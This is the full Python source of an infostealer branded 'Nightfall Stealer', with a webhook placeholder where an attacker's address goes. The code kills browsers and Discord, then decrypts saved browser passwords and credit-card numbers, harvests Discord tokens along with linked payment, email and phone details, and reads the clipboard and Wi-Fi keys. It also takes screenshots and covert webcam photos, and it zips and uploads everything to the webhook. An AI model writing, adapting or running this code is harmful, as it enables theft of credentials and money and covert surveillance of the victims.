import os
import subprocess
import time
import shutil
import random
import re
import threading
import zipfile
from sqlite3 import connect as sql_connect
from datetime import datetime, timezone, timedelta
from base64 import b64decode
from json import loads as json_loads, dumps
from pathlib import Path
import requests
import pyautogui
import cv2
import win32crypt
import win32clipboard
from Crypto.Cipher import AES

WEBHOOK = "yourwebhookhere"

TEMP = os.getenv("TEMP") or os.path.expanduser("~/AppData/Local/Temp")
WORK_DIR = os.path.join(TEMP, f"NF_{random.randint(10000, 99999)}")
os.makedirs(WORK_DIR, exist_ok=True)

NIGHTFALL_ASCII = """
__________________________________________
|        _       _     _    __       _ _ |
|  _ __ (_) __ _| |__ | |_ / _| __ _| | ||
| | '_ \| |/ _` | '_ \| __| |_ / _` | | ||
| | | | | | (_| | | | | |_|  _| (_| | | ||
| |_| |_|_|\\__, |_| |_|\\__|_|  \\__,_|_|_||
|  | |    _|___/ __   | |_ ___  _ __     |
| / __)  / _ \\| '_ \\  | __/ _ \\| '_ \\    |
| \\__ \\ | (_) | | | | | || (_) | |_) |   |
| (   /  \\___/|_| |_|  \\__\\___/| .__/    |
|  |_|                         |_|       |
|________________________________________|
"""

def get_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text.strip()
    except:
        return "N/A"

def get_master_key(search_path):
    for depth in range(5):
        p = search_path
        for _ in range(depth):
            p = os.path.dirname(p)
            if not p or p == os.path.dirname(p):
                break
        local_path = os.path.join(p, "Local State")
        if os.path.exists(local_path):
            try:
                with open(local_path, "r", encoding="utf-8") as f:
                    local = json_loads(f.read())
                enc_key = b64decode(local["os_crypt"]["encrypted_key"])[5:]
                return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
            except:
                continue
    return None

def decrypt_value(buff, master_key):
    if not master_key or not isinstance(buff, bytes) or len(buff) < 3:
        return ""
    try:
        if buff[:3] in (b'v10', b'v11'):
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            dec = cipher.decrypt(payload)[:-16]
            return dec.decode('utf-8', errors='ignore')
        else:
            dec = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]
            return dec.decode('utf-8', errors='ignore')
    except:
        return ""

def send_embed(title, desc="", color=0x191919, fields=None, files=None, thumbnail=None, image=None):
    embed = {
        "title": title,
        "description": f"```ansi\n{desc}\n```" if desc else None,
        "color": color,
        "timestamp": datetime.utcnow().isoformat(),
        "footer": {
            "text": "Nightfall Stealer",
            "icon_url": "https://files.catbox.moe/nt0b4j.png"
        },
    }
    if fields:
        embed["fields"] = fields
    if thumbnail:
        embed["thumbnail"] = {"url": thumbnail}
    if image:
        embed["image"] = {"url": image}
    payload = {
        "username": "Nightfall Stealer",
        "avatar_url": "https://files.catbox.moe/nt0b4j.png",
        "embeds": [embed]
    }
    try:
        if files:
            requests.post(WEBHOOK, data={"payload_json": dumps(payload)}, files=files, timeout=15)
        else:
            requests.post(WEBHOOK, json=payload, timeout=15)
    except:
        pass

def send_full_txt(title, lines):
    if not lines:
        return
    fname = f"{title.lower().replace(' ','_')}_{random.randint(10000,99999)}.txt"
    path = os.path.join(WORK_DIR, fname)
    with open(path, "w", encoding="utf-8", errors="replace") as f:
        f.write(NIGHTFALL_ASCII + "\n\n")
        f.write(f"{title.upper()} — {len(lines)} entries\n")
        f.write("═"*70 + "\n\n")
        f.write("\n".join(lines))
        f.write("\n\n" + "═"*70 + "\n")
        f.write("Generated: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    try:
        with open(path, "rb") as f:
            files = {"file": (fname, f, "text/plain")}
            send_embed(f"{title} Data", f"Total: **{len(lines)}** entries", 0x191919, files=files)
    except:
        pass

def steal_browser_data():
    browsers = [
        {"name": "Chrome", "base": os.getenv('LOCALAPPDATA') + "\\Google\\Chrome\\User Data"},
        {"name": "Brave", "base": os.getenv('LOCALAPPDATA') + "\\Brave Software\\Brave-Browser\\User Data"},
        {"name": "Edge", "base": os.getenv('LOCALAPPDATA') + "\\Microsoft\\Edge\\User Data"},
        {"name": "Opera", "base": os.getenv('APPDATA') + "\\Opera Software\\Opera Stable"},
        {"name": "Opera GX", "base": os.getenv('APPDATA') + "\\Opera Software\\Opera GX Stable"},
    ]
    pw_lines = []
    cc_lines = []
    hist_lines = []
    for br in browsers:
        base = br["base"]
        if not os.path.exists(base):
            continue
        profiles = ["Default"] + [d for d in os.listdir(base) if d.startswith("Profile ") and os.path.isdir(os.path.join(base, d))]
        for prof in profiles:
            ppath = os.path.join(base, prof)
            master_key = get_master_key(ppath)
            if not master_key:
                master_key = get_master_key(base)
            if not master_key:
                continue
            pw_path = os.path.join(ppath, "Login Data")
            if os.path.exists(pw_path):
                tmp = os.path.join(WORK_DIR, f"pw_{random.randint(10000,99999)}.db")
                shutil.copy2(pw_path, tmp)
                try:
                    conn = sql_connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for url, user, enc in cur.fetchall():
                        if isinstance(enc, bytes) and enc:
                            pw = decrypt_value(enc, master_key)
                            if pw and len(pw) > 1:
                                pw_lines.append(f"URL: {url}\nUser: {user}\nPass: {pw}\n{'─'*70}")
                    conn.close()
                except:
                    pass
                finally:
                    try: os.remove(tmp)
                    except: pass
            cc_path = os.path.join(ppath, "Web Data")
            if os.path.exists(cc_path):
                tmp = os.path.join(WORK_DIR, f"cc_{random.randint(10000,99999)}.db")
                shutil.copy2(cc_path, tmp)
                try:
                    conn = sql_connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    for name, m, y, enc in cur.fetchall():
                        if isinstance(enc, bytes) and enc:
                            num = decrypt_value(enc, master_key)
                            if num:
                                cc_lines.append(f"{name} | {m:02d}/{y} | {num}")
                    conn.close()
                except:
                    pass
                finally:
                    try: os.remove(tmp)
                    except: pass
            hist_path = os.path.join(ppath, "History")
            if os.path.exists(hist_path):
                tmp = os.path.join(WORK_DIR, f"hist_{random.randint(10000,99999)}.db")
                shutil.copy2(hist_path, tmp)
                try:
                    conn = sql_connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC")
                    for url, title in cur.fetchall():
                        hist_lines.append(f"{title[:80]} → {url}")
                    conn.close()
                except:
                    pass
                finally:
                    try: os.remove(tmp)
                    except: pass
    if pw_lines:
        send_full_txt("Passwords", pw_lines)
    if cc_lines:
        send_full_txt("Credit Cards", cc_lines)
    if hist_lines:
        send_full_txt("Browsing History", hist_lines)

def get_user_info(token):
    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=12)
        if r.status_code == 200:
            return r.json()
        return None
    except:
        return None

def get_guilds(token):
    headers = {"Authorization": token}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers, timeout=12)
        if r.ok:
            return r.json()
        return []
    except:
        return []

def get_nitro_subscriptions(token):
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers={"Authorization": token}, timeout=10)
        if r.ok:
            return r.json()
        return []
    except:
        return []

def get_boost_slots(token):
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers={"Authorization": token}, timeout=10)
        if r.ok:
            return r.json()
        return []
    except:
        return []

def get_payment_sources(token):
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers={"Authorization": token}, timeout=10)
        if r.ok:
            return r.json()
        return []
    except:
        return []

def snowflake_to_date(snowflake):
    epoch = datetime(2015, 1, 1, tzinfo=timezone.utc)
    ms = (int(snowflake) >> 22)
    return (epoch + timedelta(milliseconds=ms)).strftime("%Y-%m-%d %H:%M UTC")

def steal_discord_tokens():
    possible_paths = [
        os.path.expandvars(r"%APPDATA%\discord"),
        os.path.expandvars(r"%APPDATA%\discordcanary"),
        os.path.expandvars(r"%APPDATA%\discordptb"),
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default"),
        *[str(p) for p in Path(os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")).glob("Profile *")],
        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default"),
        os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default"),
        os.path.expandvars(r"%LOCALAPPDATA%\Opera Software\Opera Stable"),
        os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\User Data\Default"),
        os.path.expandvars(r"%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\Default"),
    ]
    tokens = set()
    for base in possible_paths:
        leveldb = os.path.join(base, "Local Storage", "leveldb")
        if not os.path.isdir(leveldb):
            continue
        for ext in ("*.ldb", "*.log"):
            for file in Path(leveldb).rglob(ext):
                try:
                    raw = file.read_bytes()
                    text = raw.decode("utf-8", errors="ignore")
                    for match in re.finditer(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{38,}(?:_[\w-]{22})?|mfa\.[\w-]{80,84}|eyJ[A-Za-z0-9_-]{60,400}", text):
                        t = match.group(0).strip()
                        if len(t) >= 59:
                            tokens.add(t)
                except:
                    pass
    tokens = {t for t in tokens if '.' in t and not t.startswith("eyJ")}
    if not tokens:
        send_embed("no discord tokens found on retards machine", "Nothing detected.")
        return

    token_lines = []
    send_embed(f"Tokens Found — {len(tokens)}", f"**{len(tokens)}** token(s) located", 0x191919, fields=[
        {"name": "Computer", "value": f"`{os.environ.get('COMPUTERNAME','Unknown')}`", "inline": True},
        {"name": "User", "value": f"`{os.environ.get('USERNAME','Unknown')}`", "inline": True},
        {"name": "IP", "value": f"`{get_ip()}`", "inline": True},
    ])

    for token in tokens:
        info = get_user_info(token)
        if not info:
            continue

        disp = f"{info.get('global_name', '')} (@{info['username']})" if info.get('global_name') else info["username"]
        nitro_type = {0: "None", 1: "Classic", 2: "Full Nitro"}.get(info.get("premium_type", 0), "Unknown")
        mfa = "Yes" if info.get("mfa_enabled") else "No"
        created = snowflake_to_date(info["id"])
        thumb = f"https://cdn.discordapp.com/avatars/{info['id']}/{info['avatar']}.webp?size=512" if info.get("avatar") else None
        banner = f"https://cdn.discordapp.com/banners/{info['id']}/{info['banner']}.webp?size=1024" if info.get("banner") else None

        badges = []
        flags = info.get("public_flags", 0)
        if flags & 1: badges.append("Staff")
        if flags & 2: badges.append("Partner")
        if flags & 4: badges.append("HypeSquad Events")
        if flags & 64: badges.append("HypeSquad Bravery")
        if flags & 128: badges.append("HypeSquad Brilliance")
        if flags & 256: badges.append("HypeSquad Balance")
        if flags & 512: badges.append("Early Supporter")
        if flags & 16384: badges.append("Bug Hunter Gold")
        if flags & 262144: badges.append("Certified Moderator")
        if flags & 4194304: badges.append("Active Developer")
        badges_str = ", ".join(badges) if badges else "None"

        decos = info.get("avatar_decoration_data") or info.get("avatar_decorations")
        deco_count = len(decos) if isinstance(decos, list) else (1 if decos else 0)

        subs = get_nitro_subscriptions(token)
        has_nitro = len(subs) > 0
        nitro_expires = datetime.fromisoformat(subs[0]["current_period_end"].replace("Z", "+00:00")).strftime("%d/%m/%Y %H:%M") if has_nitro else "N/A"

        slots = get_boost_slots(token)
        avail_boost = 0
        boost_lines = []
        for slot in slots:
            if not slot.get("cooldown_ends_at") or datetime.fromisoformat(slot["cooldown_ends_at"].replace("Z", "+00:00")) < datetime.now(timezone.utc):
                avail_boost += 1
                boost_lines.append("Available now")
            else:
                dt = datetime.fromisoformat(slot["cooldown_ends_at"].replace("Z", "+00:00"))
                boost_lines.append(f"Cooldown until {dt.strftime('%d/%m/%Y %H:%M')}")

        payments = get_payment_sources(token)
        pay_count = len(payments)
        valid_pays = sum(1 for p in payments if not p.get("invalid"))
        pay_types = " ".join("CC" if p["type"] == 1 else "PP" if p["type"] == 2 else "?" for p in payments)

        guilds = get_guilds(token)
        guild_count = len(guilds)
        admin_guilds = []
        for g in guilds:
            perms = int(g.get("permissions", "0"))
            if perms & (0x8 | 0x20):
                cnt = g.get("approximate_member_count", "?")
                line = f"ㅤ- {g['name']} ({cnt})"
                if g.get("vanity_url_code"):
                    line += f" • .gg/{g['vanity_url_code']}"
                admin_guilds.append(line)
        admin_text = "\n".join(admin_guilds) if admin_guilds else "None"

        fields = [
            {"name": "Token", "value": f"```ansi\n\u001b[0;31m{token}\u001b[0m```", "inline": False},
            {"name": "Username", "value": f"**{disp}**", "inline": True},
            {"name": "ID", "value": f"`{info['id']}`", "inline": True},
            {"name": "Created", "value": created, "inline": True},
            {"name": "Nitro Type", "value": nitro_type, "inline": True},
            {"name": "MFA", "value": mfa, "inline": True},
            {"name": "Badges", "value": badges_str, "inline": False},
            {"name": "Decorations", "value": f"**{deco_count}** deco(s)", "inline": True},
            {"name": "Guilds", "value": f"{guild_count} total\nAdmin in:\n{admin_text}", "inline": False},
            {"name": "Nitro Details", "value": f"Has Nitro: {has_nitro}\nExpires: {nitro_expires}\nBoosts: {avail_boost}\n" + "\n".join(boost_lines), "inline": False},
            {"name": "Payments", "value": f"Methods: {pay_count}\nValid: {valid_pays}\nTypes: {pay_types}", "inline": False},
            {"name": "Locale", "value": info.get("locale", "Unknown"), "inline": True},
            {"name": "Verified", "value": "Yes" if info.get("verified") else "No", "inline": True},
        ]
        if info.get("email"):
            fields.append({"name": "Email", "value": f"`{info['email']}`", "inline": True})
        if info.get("phone"):
            fields.append({"name": "Phone", "value": f"`{info['phone']}`", "inline": True})

        send_embed("Account Details", "", 0x191919, fields=fields, thumbnail=thumb, image=banner)

        token_lines.append(f"Token: {token}")
        token_lines.append(f"Username: {disp}")
        token_lines.append(f"ID: {info['id']}")
        token_lines.append(f"Created: {created}")
        token_lines.append(f"Nitro: {nitro_type}")
        token_lines.append(f"MFA: {mfa}")
        token_lines.append(f"Badges: {badges_str}")
        token_lines.append(f"Email: {info.get('email', 'N/A')}")
        token_lines.append(f"Phone: {info.get('phone', 'N/A')}")
        token_lines.append("─" * 70)

    if token_lines:
        fname = f"discord_tokens_{random.randint(10000,99999)}.txt"
        path = os.path.join(WORK_DIR, fname)
        with open(path, "w", encoding="utf-8", errors="replace") as f:
            f.write(NIGHTFALL_ASCII + "\n\n")
            f.write(f"DISCORD TOKENS — {len(tokens)} entries\n")
            f.write("═"*70 + "\n\n")
            f.write("\n".join(token_lines))
            f.write("\n\n" + "═"*70 + "\n")
            f.write("Generated: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

def steal_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
        if data and len(data) > 3:
            lines = [data[i:i+120] for i in range(0, len(data), 120)]
            send_full_txt("Clipboard Content", lines)
    except:
        pass

def steal_wifi():
    try:
        data = subprocess.getoutput('netsh wlan show profiles')
        profiles = re.findall(r'All User Profile\s+:\s+(.*)', data)
        lines = []
        for profile in profiles:
            profile = profile.strip()
            pwd_data = subprocess.getoutput(f'netsh wlan show profile name="{profile}" key=clear')
            pwd = re.search(r'Key Content\s+:\s+(.*)', pwd_data)
            pwd = pwd.group(1) if pwd else "No Password"
            lines.append(f"{profile} → {pwd}")
        send_full_txt("WiFi Passwords", lines)
    except:
        pass

def take_screenshot():
    try:
        img = pyautogui.screenshot()
        path = os.path.join(WORK_DIR, f"screenshot_{random.randint(10000,99999)}.png")
        img.save(path)
        with open(path, "rb") as f:
            files = {"file": (os.path.basename(path), f)}
            send_embed("Desktop Screenshot", "Captured.", 0x191919, files=files)
    except:
        pass

def take_webcam():
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            cap = cv2.VideoCapture(0)
        time.sleep(1.2)
        ret, frame = cap.read()
        cap.release()
        if ret:
            path = os.path.join(WORK_DIR, f"webcam_{random.randint(10000,99999)}.jpg")
            cv2.imwrite(path, frame)
            with open(path, "rb") as f:
                files = {"file": (os.path.basename(path), f)}
                send_embed("Webcam Capture", "Photo taken.", 0x191919, files=files)
    except:
        pass

def create_final_zip():
    if os.path.exists(os.path.join(WORK_DIR, "telegram")):
        shutil.rmtree(os.path.join(WORK_DIR, "telegram"), ignore_errors=True)
    if not os.listdir(WORK_DIR):
        send_embed("Nightfall Complete Package", "No data collected.", 0x191919)
        return
    zip_name = f"nightfall_full_{random.randint(10000,99999)}.zip"
    zip_path = os.path.join(TEMP, zip_name)
    folder_map = {
        "screenshot": "Screenshots",
        "webcam": "Webcam",
        "pw_": "Browser/Passwords",
        "cc_": "Browser/Credit Cards",
        "hist_": "Browser/History",
        "clipboard": "System/Clipboard",
        "wifi": "System/WiFi",
    }
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
        for root, dirs, files in os.walk(WORK_DIR):
            for file in files:
                file_path = os.path.join(root, file)
                rel_path = os.path.relpath(file_path, WORK_DIR).replace("\\", "/")
                arcname = rel_path
                for key, folder in folder_map.items():
                    if key in file.lower() or key in root.lower():
                        arcname = f"{folder}/{file}"
                        break
                else:
                    arcname = f"Other/{file}"
                zipf.write(file_path, arcname)
    try:
        with open(zip_path, "rb") as f:
            files = {"file": (zip_name, f, "application/zip")}
            send_embed("Nightfall Full Archive", "All data collected and zipped.", 0x191919, files=files)
    except:
        pass
    try:
        os.remove(zip_path)
    except:
        pass

def main():
    subprocess.call("taskkill /f /im discord.exe /im chrome.exe /im brave.exe /im msedge.exe /im opera.exe >nul 2>&1", shell=True)
    send_embed("Nightfall Stealer Started")
    threads = [
        threading.Thread(target=steal_discord_tokens, daemon=True),
        threading.Thread(target=steal_browser_data, daemon=True),
        threading.Thread(target=steal_clipboard, daemon=True),
        threading.Thread(target=steal_wifi, daemon=True),
        threading.Thread(target=take_screenshot, daemon=True),
        threading.Thread(target=take_webcam, daemon=True),
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    time.sleep(8)
    create_final_zip()
    try:
        shutil.rmtree(WORK_DIR, ignore_errors=True)
    except:
        pass
    send_embed("nightfall stealer finished", color=0x191919)

if __name__ == "__main__":
    main()